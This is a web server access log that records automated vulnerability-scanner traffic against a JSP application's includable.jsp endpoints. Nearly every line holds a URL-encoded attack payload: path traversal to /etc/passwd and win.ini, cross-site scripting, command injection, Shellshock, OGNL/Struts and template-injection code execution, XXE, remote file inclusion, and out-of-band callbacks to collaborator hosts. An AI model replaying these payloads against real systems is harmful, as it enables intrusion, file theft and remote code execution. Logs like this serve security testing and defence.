203.141.138.55 - - [20/Dec/2019:08:27:19 +0000] "GET /dfi/xblma%3ca%3ei33dz?template=style_materialize.html HTTP/1.1" 404 1018
203.141.138.55 - - [20/Dec/2019:08:27:19 +0000] "GET /dfi/xblma%253ca%253ei33dz?template=style_materialize.html HTTP/1.1" 404 1026
52.69.45.235 - - [20/Dec/2019:08:27:19 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html HTTP/1.1" 200 3116
203.141.138.55 - - [20/Dec/2019:08:27:19 +0000] "GET /dfi/%00xblma%3ca%3ei33dz?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:20 +0000] "GET /dfi/includable.jsp?template=style_bootstrap.html%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F6%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:20 +0000] "GET /dfi/igz0kg8wdy%3e%3c?template=style_materialize.html HTTP/1.1" 404 1016
52.69.45.235 - - [20/Dec/2019:08:27:20 +0000] "GET /dfi/includable.jsp?template=style_bootstrap.html%27 HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:20 +0000] "GET /dfi/igz0kg8wdy%253e%253c?template=style_materialize.html HTTP/1.1" 404 1024
52.69.45.235 - - [20/Dec/2019:08:27:20 +0000] "GET /dfi/includable.jsp?template=style_bootstrap.html%2F*%2F HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:21 +0000] "GET /dfi/%00igz0kg8wdy%3e%3c?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:21 +0000] "GET /dfi/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:21 +0000] "GET /dfi/n5226$%7b785*554%7ddpdqo?template=style_materialize.html HTTP/1.1" 404 1032
52.69.45.235 - - [20/Dec/2019:08:27:21 +0000] "GET /dfi/includable.jsp?template=style_bootstrap.html%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 3374
203.141.138.55 - - [20/Dec/2019:08:27:21 +0000] "GET /dfi/hm1w4%7b%7b996*357%7d%7drht5t?template=style_materialize.html HTTP/1.1" 404 1042
52.69.45.235 - - [20/Dec/2019:08:27:21 +0000] "GET /dfi/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2565
203.141.138.55 - - [20/Dec/2019:08:27:22 +0000] "GET /dfi/includable.jsp%7d%7dc7gej'/%22%3cl0lrm?template=style_materialize.html HTTP/1.1" 404 1060
203.141.138.55 - - [20/Dec/2019:08:27:22 +0000] "GET /dfi/includable.jsp%25%7djkjsu'/%22%3canjim?template=style_materialize.html HTTP/1.1" 404 1060
203.141.138.55 - - [20/Dec/2019:08:27:22 +0000] "GET /dfi/includable.jspkbsm9%25%3ek8cix'/%22%3cksp42?template=style_materialize.html HTTP/1.1" 404 1070
52.69.45.235 - - [20/Dec/2019:08:27:22 +0000] "GET /dfi/includable.jsp?template=style_bootstrap.html HTTP/1.1" 200 3374
203.141.138.55 - - [20/Dec/2019:08:27:23 +0000] "GET /dfi/includable.jsp'%2bsleep(20.to_i)%2b'?template=style_materialize.html HTTP/1.1" 404 1056
52.69.45.235 - - [20/Dec/2019:08:27:23 +0000] "GET / HTTP/1.1" 200 22510
203.141.138.55 - - [20/Dec/2019:08:27:23 +0000] "GET /dfi/includable.jsp'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:23 +0000] "GET /dt/includable.jsp?template=basic%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F8%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:23 +0000] "GET /dfi/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:24 +0000] "GET /dt/includable.jsp?template=basic%27 HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:24 +0000] "GET /dfi/includable.jsp'.sleep(20).'?template=style_materialize.html HTTP/1.1" 404 1038
52.69.45.235 - - [20/Dec/2019:08:27:24 +0000] "GET /dt/includable.jsp?template=basic%2F*%2F HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:24 +0000] "GET /dfi/includable.jsp%7b$%7bsleep(20)%7d%7d?template=style_materialize.html HTTP/1.1" 404 1056
52.69.45.235 - - [20/Dec/2019:08:27:24 +0000] "GET /dt/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:24 +0000] "GET /dfi/6mfrynlwby%c1%81bwwwgwdjqk?template=style_materialize.html HTTP/1.1" 404 1036
52.69.45.235 - - [20/Dec/2019:08:27:24 +0000] "GET /dt/includable.jsp?template=basic%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:25 +0000] "GET /dfi/6mfrynlwby%c1%81bwwwgwdjqk?template=style_materialize.html HTTP/1.1" 404 1036
52.69.45.235 - - [20/Dec/2019:08:27:25 +0000] "GET /dt/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2682
203.141.138.55 - - [20/Dec/2019:08:27:25 +0000] "GET /dfi/mor1ff5lsq%2541k38mdjyehi?template=style_materialize.html HTTP/1.1" 404 1034
203.141.138.55 - - [20/Dec/2019:08:27:25 +0000] "GET /dfi/mor1ff5lsq%2541k38mdjyehi?template=style_materialize.html HTTP/1.1" 404 1034
203.141.138.55 - - [20/Dec/2019:08:27:26 +0000] "GET /dfi/3agfnjmn2g%5c%5clwzvpe0dt4?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:26 +0000] "GET /dt/includable.jsp?template=basic HTTP/1.1" 200 3099
203.141.138.55 - - [20/Dec/2019:08:27:26 +0000] "GET /dfi/3agfnjmn2g%5c%5clwzvpe0dt4?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:26 +0000] "GET /dt/includable.jsp?template=basic%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F9%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2698
52.69.45.235 - - [20/Dec/2019:08:27:26 +0000] "GET /dt/includable.jsp?template=basic%27 HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:26 +0000] "GET /dfi/ke4f42r770%26%2365%3b24sk3y09wj?template=style_materialize.html HTTP/1.1" 404 1046
52.69.45.235 - - [20/Dec/2019:08:27:27 +0000] "GET /dt/includable.jsp?template=basic%2F*%2F HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:27 +0000] "GET /dfi/ke4f42r770%26%2365%3b24sk3y09wj?template=style_materialize.html HTTP/1.1" 404 1046
52.69.45.235 - - [20/Dec/2019:08:27:27 +0000] "GET /dt/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:27 +0000] "GET /dfi/includable.jspb6xftglqya%c1%81nqjqyn9wwu?template=style_materialize.html HTTP/1.1" 404 1064
52.69.45.235 - - [20/Dec/2019:08:27:27 +0000] "GET /dt/includable.jsp?template=basic%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:27 +0000] "GET /dfi/includable.jspb6xftglqya%c1%81nqjqyn9wwu?template=style_materialize.html HTTP/1.1" 404 1064
52.69.45.235 - - [20/Dec/2019:08:27:28 +0000] "GET /dt/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2682
203.141.138.55 - - [20/Dec/2019:08:27:28 +0000] "GET /dfi/includable.jsp3ts2jy3mi7%25418zlf925mh7?template=style_materialize.html HTTP/1.1" 404 1062
203.141.138.55 - - [20/Dec/2019:08:27:28 +0000] "GET /dfi/includable.jsp3ts2jy3mi7%25418zlf925mh7?template=style_materialize.html HTTP/1.1" 404 1062
203.141.138.55 - - [20/Dec/2019:08:27:28 +0000] "GET /dfi/includable.jsp4fp92rcu92%5c%5clvlgdnvju8?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:29 +0000] "GET /dt/includable.jsp?template=basic HTTP/1.1" 200 3099
203.141.138.55 - - [20/Dec/2019:08:27:29 +0000] "GET /dfi/includable.jsp4fp92rcu92%5c%5clvlgdnvju8?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:29 +0000] "GET /dt/includable.jsp?template=monochro%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F10%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:29 +0000] "GET /dfi/includable.jspgudust37qk%26%2365%3bh19wufenmr?template=style_materialize.html HTTP/1.1" 404 1074
52.69.45.235 - - [20/Dec/2019:08:27:29 +0000] "GET /dt/includable.jsp?template=monochro%27 HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:29 +0000] "GET /dfi/includable.jspgudust37qk%26%2365%3bh19wufenmr?template=style_materialize.html HTTP/1.1" 404 1074
52.69.45.235 - - [20/Dec/2019:08:27:30 +0000] "GET /dt/includable.jsp?template=monochro%2F*%2F HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:30 +0000] "GET /dfi/oog0nhndzurgdmim2ly4295rui0bo4cw0nsaiy7.burpcollaborator.net?template=style_materialize.html HTTP/1.1" 404 1104
52.69.45.235 - - [20/Dec/2019:08:27:30 +0000] "GET /dt/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:30 +0000] "GET /dfi/http%3a//v9578o8kk1cnyt3tnsjbngqyfpli9bx1lsdf33s.burpcollaborator.net/%3fincludable.jsp?template=style_materialize.html HTTP/1.1" 404 1158
52.69.45.235 - - [20/Dec/2019:08:27:30 +0000] "GET /dt/includable.jsp?template=monochro%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 2698
203.141.138.55 - - [20/Dec/2019:08:27:30 +0000] "GET /dfi/Http%3a//jg3vfcf8rpjb5hahugqzu4xmmds6gz4s6gx8ky8n.burpcollaborator.net/%3fincludable.jsp?template=style_materialize.html HTTP/1.1" 404 1160
52.69.45.235 - - [20/Dec/2019:08:27:30 +0000] "GET /dt/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2682
203.141.138.55 - - [20/Dec/2019:08:27:31 +0000] "GET /dfi/https%3a//8x6kw1wx8e00m6r6b57obteb329vxolf961trhg.burpcollaborator.net/%3fincludable.jsp?template=style_materialize.html HTTP/1.1" 404 1160
203.141.138.55 - - [20/Dec/2019:08:27:31 +0000] "GET /dfi/nslookup%20-q%3dcname%20xwx9vqvm73zplvqvau6daid02r8kwdk6nuem1cp1.burpcollaborator.net.%26?template=style_materialize.html HTTP/1.1" 404 1162
52.69.45.235 - - [20/Dec/2019:08:27:31 +0000] "GET /dt/includable.jsp?template=monochro HTTP/1.1" 200 3117
203.141.138.55 - - [20/Dec/2019:08:27:32 +0000] "GET /dfi/includable.jsp%7cnslookup%20-q%3dcname%20esaqr7r33kv6hcmc6b2u6z9hy841sugq4hw4msb.burpcollaborator.net.%26?template=style_materialize.html HTTP/1.1" 404 1194
52.69.45.235 - - [20/Dec/2019:08:27:32 +0000] "GET / HTTP/1.1" 200 22510
203.141.138.55 - - [20/Dec/2019:08:27:32 +0000] "GET /dfi/includable.jsp'%22%600%26nslookup%20-q%3dcname%20ar5mq3qz2gu2g8l8571q5v8dx43xrqfn3ev1lpa.burpcollaborator.net.%26%60'?template=style_materialize.html HTTP/1.1" 404 1218
52.69.45.235 - - [20/Dec/2019:08:27:32 +0000] "GET /uid/clientinfo.jsp HTTP/1.1" 200 3526
203.141.138.55 - - [20/Dec/2019:08:27:32 +0000] "GET /dfi/includable.jsp%26nslookup%20-q%3dcname%20g2js1915dm58rewegdcwg1jj8ae32wqrei65wtl.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20g2js1915dm58rewegdcwg1jj8ae32wqrei65wtl.burpcollaborator.net.%26%60'?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:32 +0000] "GET / HTTP/1.1" 200 22510
203.141.138.55 - - [20/Dec/2019:08:27:33 +0000] "GET /dfi/includable.jsp%7cecho%20yisyw9woj4%2024q6azdnxd%7c%7ca%20%23'%20%7cecho%20yisyw9woj4%2024q6azdnxd%7c%7ca%20%23%7c%22%20%7cecho%20yisyw9woj4%2024q6azdnxd%7c%7ca%20%23?template=style_materialize.html HTTP/1.1" 404 1314
203.141.138.55 - - [20/Dec/2019:08:27:33 +0000] "GET /dfi/includable.jsp%26echo%20yg4g0y1a7k%20fb0en3wely%26?template=style_materialize.html HTTP/1.1" 404 1084
203.141.138.55 - - [20/Dec/2019:08:27:33 +0000] "GET /dfi/includable.jsp%22%7cecho%20uugda0rr6y%20dmvbw77oag%20%7c%7c?template=style_materialize.html HTTP/1.1" 404 1102
203.141.138.55 - - [20/Dec/2019:08:27:34 +0000] "GET /dfi/includable.jsp'%7cecho%20fcd7w1mdpg%20xin03d8k8o%20%23xzwx?template=style_materialize.html HTTP/1.1" 404 1100
203.141.138.55 - - [20/Dec/2019:08:27:34 +0000] "GET /dfi/includable.jsp%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:34 +0000] "GET /dfi/includable.jsp%7cping%20-c%2021%20127.0.0.1%7c%7cx?template=style_materialize.html HTTP/1.1" 404 1084
203.141.138.55 - - [20/Dec/2019:08:27:35 +0000] "GET /dfi/includable.jsp%26ping%20-n%2021%20127.0.0.1%26?template=style_materialize.html HTTP/1.1" 404 1076
203.141.138.55 - - [20/Dec/2019:08:27:35 +0000] "GET /dfi/includable.jsp'%7cping%20-c%2021%20127.0.0.1%20%23?template=style_materialize.html HTTP/1.1" 404 1084
203.141.138.55 - - [20/Dec/2019:08:27:35 +0000] "GET /dfi/includable.jsp%22%7cping%20-n%2021%20127.0.0.1%20%7c%7c?template=style_materialize.html HTTP/1.1" 404 1094
203.141.138.55 - - [20/Dec/2019:08:27:36 +0000] "GET /dfi/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:36 +0000] "GET /dfi/c%3a%5cwindows%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:36 +0000] "GET /dfi/../../../../../../../../../../../../../../../../windows/win.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:37 +0000] "GET /dfi/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:37 +0000] "GET /dfi/../../../../../../../../../../../../../../../../winnt/win.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:37 +0000] "GET /dfi/%5cwindows%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:38 +0000] "GET /dfi/file%3a///c%3a/windows/win.ini?template=style_materialize.html HTTP/1.1" 404 1044
203.141.138.55 - - [20/Dec/2019:08:27:38 +0000] "GET /dfi/...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5cwindows%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:38 +0000] "GET /dfi/.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5cwindows/win.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:39 +0000] "GET /dfi/...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./windows/win.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:39 +0000] "GET /dfi/%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9cwindows%c0%9cwin.ini?template=style_materialize.html HTTP/1.1" 404 1384
203.141.138.55 - - [20/Dec/2019:08:27:39 +0000] "GET /dfi/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini?template=style_materialize.html HTTP/1.1" 404 1322
203.141.138.55 - - [20/Dec/2019:08:27:40 +0000] "GET /dfi/includable.jsp..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:40 +0000] "GET /dfi/includable.jsp../../../../../../../../../../../../../../../../windows/win.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:40 +0000] "GET /dfi/includable.jsp..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:41 +0000] "GET /dfi/includable.jsp../../../../../../../../../../../../../../../../winnt/win.ini?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:41 +0000] "GET /dfi/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00includable.jsp?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:41 +0000] "GET /dfi/c%3a%5cwindows%5cwin.ini%00includable.jsp?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:42 +0000] "GET /dfi/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini%00includable.jsp?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:42 +0000] "GET /dfi/../../../../../../../../../../../../../../../../etc/passwd?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:42 +0000] "GET /dfi//etc/passwd?template=style_materialize.html HTTP/1.1" 404 1006
203.141.138.55 - - [20/Dec/2019:08:27:43 +0000] "GET /dfi/file%3a///etc/passwd?template=style_materialize.html HTTP/1.1" 404 1024
203.141.138.55 - - [20/Dec/2019:08:27:43 +0000] "GET /dfi/..././..././..././..././..././..././..././..././..././..././etc/passwd?template=style_materialize.html HTTP/1.1" 404 1124
203.141.138.55 - - [20/Dec/2019:08:27:43 +0000] "GET /dfi/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd?template=style_materialize.html HTTP/1.1" 404 1374
203.141.138.55 - - [20/Dec/2019:08:27:44 +0000] "GET /dfi/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd?template=style_materialize.html HTTP/1.1" 404 1312
203.141.138.55 - - [20/Dec/2019:08:27:44 +0000] "GET /dfi/includable.jsp../../../../../../../../../../../../../../../../etc/passwd?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:45 +0000] "GET /dfi/../../../../../../../../../../../../../../../../etc/passwd%00includable.jsp?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:45 +0000] "GET /dfi/%3ccdl%20xmlns%3d%22http%3a//a.b/%22%20xmlns%3axsi%3d%22http%3a//www.w3.org/2001/XMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a//a.b/%20http%3a//qic2hjhftwli7ocowns6wbztokudi666uxmkc81.burpcollaborator.net/cdl.xsd%22%3ecdl%3c/cdl%3e?template=style_materialize.html HTTP/1.1" 404 1470
203.141.138.55 - - [20/Dec/2019:08:27:45 +0000] "GET /dfi/%3crlq%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//kocwndn9zqrcdiii2hy0255nue07o0c10ssfi37.burpcollaborator.net/foo%22/%3e%3c/rlq%3e?template=style_materialize.html HTTP/1.1" 404 1348
203.141.138.55 - - [20/Dec/2019:08:27:46 +0000] "GET /dfi/includable.jsp]]%3e%3e%3c?template=style_materialize.html HTTP/1.1" 404 1034
203.141.138.55 - - [20/Dec/2019:08:27:46 +0000] "GET /dfi/includable.jsp'%2b(function()%7bif(typeof%20q9e4g%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bq9e4g%3d1%3b%7d%7d())%2b'?template=style_materialize.html HTTP/1.1" 404 1346
203.141.138.55 - - [20/Dec/2019:08:27:46 +0000] "GET /dfi/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%2272z%22%20value%3d%2261yi0z0vcc%22--%3e%3c!--%23set%20var%3d%22941%22%20value%3d%22830k212xee%22--%3e%3c!--%23echo%20var%3d%2272z%22--%3e%3c!--%23echo%20var%3d%22941%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20tol5nmnizzrldrir2qy92e5wun0go9c1ap1ho7cw.burpcollaborator.net%22%20--%3e?template=style_materialize.html HTTP/1.1" 404 1662
203.141.138.55 - - [20/Dec/2019:08:27:47 +0000] "GET /dfi/includable.jsp%0d%0aBCC%3a5y4hxyxu9b1xn3s3c28lcqf84zasylmdf16ttjh8@burpcollaborator.net%0d%0ahtm%3a%20o?template=style_materialize.html HTTP/1.1" 404 1190
203.141.138.55 - - [20/Dec/2019:08:27:47 +0000] "GET /dfi/includable.jsp%3e%0d%0aBCC%3aqoi2njnfzwridoio2ny62b5tuk0do6cy6mxek48t@burpcollaborator.net%0d%0avwf%3a%20g?template=style_materialize.html HTTP/1.1" 404 1196
203.141.138.55 - - [20/Dec/2019:08:27:47 +0000] "GET /dfi/()%20%7b%20%3a%3b%7d%3b%20/bin/sleep%200?template=style_materialize.html HTTP/1.1" 404 1064
203.141.138.55 - - [20/Dec/2019:08:27:48 +0000] "GET /dfi/()%20%7b%20%3a%3b%7d%3b%20/bin/sleep%2011?template=style_materialize.html HTTP/1.1" 404 1066
203.141.138.55 - - [20/Dec/2019:08:27:48 +0000] "GET /dfi/%60sleep%2011%60?template=style_materialize.html HTTP/1.1" 404 1016
203.141.138.55 - - [20/Dec/2019:08:27:48 +0000] "GET /dfi/$(sleep%2011)?template=style_materialize.html HTTP/1.1" 404 1010
203.141.138.55 - - [20/Dec/2019:08:27:49 +0000] "GET /dfi/$%7b(new%20java.io.BufferedReader(new%20java.io.InputStreamReader(((new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7b%22timeout%22%2c%2211%22%7d)).start()).getInputStream()))).readLine()%7d$%7b(new%20java.io.BufferedReader(new%20java.io.InputStreamReader(((new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7b%22sleep%22%2c%2211%22%7d)).start()).getInputStream()))).readLine()%7d?template=style_materialize.html HTTP/1.1" 404 1772
203.141.138.55 - - [20/Dec/2019:08:27:49 +0000] "GET /dfi/()%20%7b%20_%3b%20%7d%20%3e_[$($())]%20%7b%20/bin/sleep%2011%3b%20%7d?template=style_materialize.html HTTP/1.1" 404 1122
203.141.138.55 - - [20/Dec/2019:08:27:49 +0000] "GET /dfi/%25%7b3300*9029%7d?template=style_materialize.html HTTP/1.1" 404 1020
203.141.138.55 - - [20/Dec/2019:08:27:50 +0000] "GET /dfi/3322*4088?template=style_materialize.html HTTP/1.1" 404 1002
203.141.138.55 - - [20/Dec/2019:08:27:50 +0000] "GET /dfi/$%7b9522*8578%7d?template=style_materialize.html HTTP/1.1" 404 1016
203.141.138.55 - - [20/Dec/2019:08:27:51 +0000] "GET /dfi/256o''vbhh?template=style_materialize.html HTTP/1.1" 404 1004
203.141.138.55 - - [20/Dec/2019:08:27:51 +0000] "GET /dfi/@(6178*2207)?template=style_materialize.html HTTP/1.1" 404 1008
203.141.138.55 - - [20/Dec/2019:08:27:51 +0000] "GET /dfi/a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:52 +0000] "GET /dfi/ycxi%3c!--esi--%3e76yl%3c!--esx--%3ezzrr?template=style_materialize.html HTTP/1.1" 404 1064
203.141.138.55 - - [20/Dec/2019:08:27:52 +0000] "GET /dfi/%7b!xmlparser%20v%3d'%3c!DOCTYPE%20a%20SYSTEM%20%22http%3a//8hqznis6es22jtu7avjf3ys39ufk39.burpcollaborator.net/xxe%22%3e%3ca%3e%3c/a%3e'%7d?template=style_materialize.html HTTP/1.1" 404 1264
203.141.138.55 - - [20/Dec/2019:08:27:54 +0000] "GET /dfi/%25%7b(%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context['com.opensymphony.xwork2.ActionContext.container']).(%23ognlUtil%3d%23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d'ping%20ng7wodemq80769lzpajjrddnnet4ht.burpcollaborator.net%20-c1').(%23iswin%3d(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3d(%23iswin%3f%7b'cmd.exe'%2c'/c'%2c%23cmd%7d%3a%7b'/bin/bash'%2c'-c'%2c%23cmd%7d)).(%23p%3dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(@org.apache.commons.io.IOUtils@toString(%23process.getInputStream()))%7d?template=style_materialize.html HTTP/1.1" 404 2666
203.141.138.55 - - [20/Dec/2019:08:27:56 +0000] "GET /dfi/includable.jsp?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.hook[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString&hook=HOOK_VAL HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:56 +0000] "GET /dfi/includable.jsp?debug=console HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:56 +0000] "GET /dfi/includable.jsp?Class.classLoader.URLs[0]=testClassloaderManipulation1576830476 HTTP/1.1" 200 2513
